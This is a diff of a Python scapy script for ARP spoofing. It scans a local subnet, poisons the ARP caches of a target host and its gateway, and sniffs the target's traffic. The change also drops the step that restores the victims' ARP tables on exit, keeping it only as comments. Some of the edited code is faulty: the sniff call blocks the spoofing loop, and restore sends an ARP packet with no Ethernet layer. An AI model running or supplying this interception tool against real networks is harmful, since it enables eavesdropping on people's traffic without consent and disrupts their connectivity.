@@ -1,7 +1,14 @@
 import scapy.all as scapy
 import time
+import logging
+
+from scapy.sendrecv import sniff
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
+clientInfo = []
+iter=0
+pakt = [100]
 def scan(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -12,6 +19,7 @@ def scan(ip):
     for element in answered_list:
         client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
         clients_list.append(client_dict)
+    
     return clients_list
 
 
@@ -29,35 +37,50 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 
 
+def action(packet):
+   # pakt[iter]=packet
+    #print(pakt[iter])
+    print("1")
+
+    
+
 def spoof(target_ip, spoof_ip):
+    # print(get_mac(target_ip) + "target")
+    # print(get_mac(spoof_ip) + "route")
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
                        psrc=spoof_ip)
     scapy.send(packet, verbose=False)
-
+    
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+    scapy.sendp(packet, verbose=False)
 
-src_ip = "192.168.0.0/24"
+src_ip = "192.168.1.0/24"
 scan_result = scan(src_ip)
 print_result(scan_result)
-target_ip = "192.168.0.103"  # Enter your target IP
-gateway_ip = "192.168.0.1"  # Enter your gateway's IP
-
+target_ip = "192.168.1.165"  # Enter your target IP
+gateway_ip = "192.168.1.1"  # Enter your gateway's IP
 try:
-    sent_packets_count = 0
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
-        time.sleep(2)  # Waits for two seconds
-
+        scapy.sniff(filter="ip src 192.168.1.165" ,prn=action)
 except KeyboardInterrupt:
     print("\nCtrl + C pressed.............Exiting")
-    restore(gateway_ip, target_ip)
-    restore(target_ip, gateway_ip)
-    print("[+] Arp Spoof Stopped")
+# try:
+#     sent_packets_count = 0
+#     while True:
+#         spoof(target_ip, gateway_ip)
+#         spoof(gateway_ip, target_ip)
+#         sent_packets_count = sent_packets_count + 2
+#         print("\r[*] Packets Sent " + str(sent_packets_count), end="")
+#         time.sleep(2)  # Waits for two seconds
+
+# except KeyboardInterrupt:
+#     print("\nCtrl + C pressed.............Exiting")
+#     restore(gateway_ip, target_ip)
+#     restore(target_ip, gateway_ip)
+#     print("[+] Arp Spoof Stopped")
